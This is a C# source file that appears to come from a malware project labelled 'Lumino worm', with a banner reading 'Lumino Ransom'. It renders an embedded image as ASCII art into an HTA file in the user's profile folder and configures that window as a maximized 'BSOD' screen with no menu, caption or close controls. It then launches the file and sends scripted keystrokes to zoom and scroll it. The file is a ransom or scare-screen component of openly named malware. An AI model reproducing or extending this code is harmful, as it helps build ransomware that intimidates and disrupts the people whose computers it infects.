/*




 :::       ...    ::  :.        :    ::: :::.    :::.     ...         :::::::..      :::.      :::.    :::.  .::::::.      ...     .        :   
 ;;;       ;;     ;;  ;;,.    ;;;   ;;;` ;;;;,  `;;;  .;;;;;;;.      ;;;;``;;;;     ;;`;;     `;;;;,  `;;;; ;;`    `   .;;;;;;;.  ;;,.    ;;;  
 [[[      [['     [[  [[[[, ,[[[[,  [[[   [[[[[. '[[, [[     \[[,     [[[,/[[['    ,[[ '[[,     [[[[[. '[[' [==/[[[[,, [[     \[[, [[[[, ,[[[[, 
 $$'      $$      $$  $$$$$$$$"$$$  $$$   $$$ "Y$c$$$ $$,     $$$     $$$$$$c     c$$$cc$$$c    $$$ "Y$c$$   '''    $$ $$,     $$$ $$$$$$$$"$$$ 
o88oo,.__ 88    .d88  888 Y88" 888o 888   888    Y88" 888,_ _,88P     888b "88bo,  888   888,   888    Y88  88b    dP" 888,_ _,88P 888 Y88" 888o
""""YUMMM  "YmmMMMM"  MMM  M'  "MMM MMM   MMM     YM   "YMMMMMP"      MMMM   "W"   YMM   ""`    MMM     YM   "YMmMY"    "YMMMMMP"  MMM  M'  "MMM   
     
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                          




*/


using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace ASCII
{
    internal class ASCII_class
    {

        readonly string userName = Environment.UserName;
        readonly string userDir = "C:\\Users\\";

        private const int WS_SYSMENU = 0x80000;
        private readonly string[] _AsciiChars = { "#", "#", "@", "%", "=", "+", "*", ":", "-", ".", "&nbsp;" };
        private string _Content;
        public void ConvertToAscii_Path()
        {
            try
            {

                
                    //Load the Image from the specified path
                    Bitmap image = new Bitmap(Lumino_worm.Properties.Resources.ASCII);
                    //Resize the image...
                    //I've used a trackBar to emulate Zoom In / Zoom Out feature
                    //This value sets the WIDTH, number of characters, of the text image
                    image = GetReSizedImage(image, 2500);

                    //Convert the resized image into ASCII
                    _Content = ConvertToAscii(image);
                    _Content = "<pre>" + _Content + "</pre>";
                    StreamWriter sw = new StreamWriter(userDir + userName + "\\Lumino.hta");
                    sw.Write("<hta:application id=\"oBVC\" \r\napplicationname=\"BSOD\"  \r\nversion=\"1.0\" \r\nmaximizebutton=\"no\" \r\nminimizebutton=\"no\" \r\nsysmenu=\"no\" \r\nCaption=\"no\" \r\nwindowstate=\"maximize\"/> \r");
                    sw.Write(_Content);
                    sw.Flush();
                    sw.Close();
            }
            catch (System.ComponentModel.Win32Exception) { }


        }


        public void ASCII_KeyboardModifer()
        {
            System.Threading.Thread.Sleep(1000);
            SendKeys.Send("^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT}");
            System.Threading.Thread.Sleep(1000);
            SendKeys.Send("{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}");
            System.Threading.Thread.Sleep(1000);
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}");
            System.Threading.Thread.Sleep(3000);
            SendKeys.Send("^+{SUBTRACT}");
            System.Threading.Thread.Sleep(2000);
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}+{DOWN}");
            System.Threading.Thread.Sleep(1000);
            SendKeys.Send("{UP}+{UP}+{UP}+{UP}+{UP}+{UP}+{UP}");
            System.Threading.Thread.Sleep(2000);
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}");
            System.Threading.Thread.Sleep(5000);
            SendKeys.Send("^+{ADD}");
            System.Threading.Thread.Sleep(1000);
            SendKeys.Send("{LEFT}");
            System.Threading.Thread.Sleep(3000);
            SendKeys.Send("{UP}+{UP}+{UP}");
        }

        private string ConvertToAscii(Bitmap image)
        {

            Boolean toggle = false;
            StringBuilder sb = new StringBuilder();

            for (int h = 0; h < image.Height; h++)
            {
                for (int w = 0; w < image.Width; w++)
                {
                    Color pixelColor = image.GetPixel(w, h);
                    //Average out the RGB components to find the Gray Color
                    int red = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;
                    int green = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;
                    int blue = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;
                    Color grayColor = Color.FromArgb(red, green, blue);

                    //Use the toggle flag to minimize height-wise stretch
                    if (!toggle)
                    {
                        int index = (grayColor.R * 10) / 255;
                        sb.Append(_AsciiChars[index]);
                    }
                }
                if (!toggle)
                {
                    sb.Append("<BR>");
                    toggle = true;
                }
                else
                {
                    toggle = false;
                }
            }

            return sb.ToString();
        }


        private Bitmap GetReSizedImage(Bitmap inputBitmap, int asciiWidth)
        {

            int asciiHeight;
            //Calculate the new Height of the image from its width
            asciiHeight = (int)Math.Ceiling((double)inputBitmap.Height * asciiWidth / inputBitmap.Width);

            //Create a new Bitmap and define its resolution
            Bitmap result = new Bitmap(asciiWidth, asciiHeight);
            Graphics g = Graphics.FromImage((Image)result);

            //The interpolation mode produces high quality images 
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
            g.DrawImage(inputBitmap, 0, 0, asciiWidth, asciiHeight);
            g.Dispose();
            return result;


        }
        public void ASCII_Art()
        {
            try
            {
                ConvertToAscii_Path();
                System.Threading.Thread.Sleep(2000);
                System.Diagnostics.Process.Start(userDir + userName + "\\Lumino.hta");
                ASCII_KeyboardModifer();
            }
            catch (System.ComponentModel.Win32Exception) { }

        }

    }
}
